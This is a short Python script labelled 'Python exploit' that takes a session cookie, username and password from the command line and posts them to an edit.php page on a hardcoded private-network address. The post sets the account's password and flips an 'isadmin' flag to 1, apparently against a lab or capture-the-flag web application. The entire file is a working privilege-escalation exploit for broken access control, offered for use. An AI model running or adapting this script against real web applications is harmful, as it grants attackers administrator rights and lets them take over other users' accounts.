from cmath import inf
from operator import contains
import requests
import html
import argparse
import os
import re

def setadmin(cookie,username,password):
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64)','Cookie':'PHPSESSID={}'.format(cookie)}
    url = "http://192.168.11.128/edit.php?username={}".format(username)
    data = {'edit':'1','username':'{}'.format(username),'password':'{}'.format(password),'isadmin':'1','submit':'Update'}
    res= requests.post(url, headers = headers,data=data)
    print('update admin sucess')
    
if __name__ == '__main__':
    parser=argparse.ArgumentParser(description='Python exploit')
    parser.add_argument('-c',"--cookie",default=None)
    parser.add_argument('-u',"--username",default=None)
    parser.add_argument('-p',"--password",default=None)
    args=parser.parse_args()
    args = parser.parse_args()
    if args.cookie  != None:
        if args.username != None:
            if args.password != None:
                setadmin(args.cookie,args.username,args.password)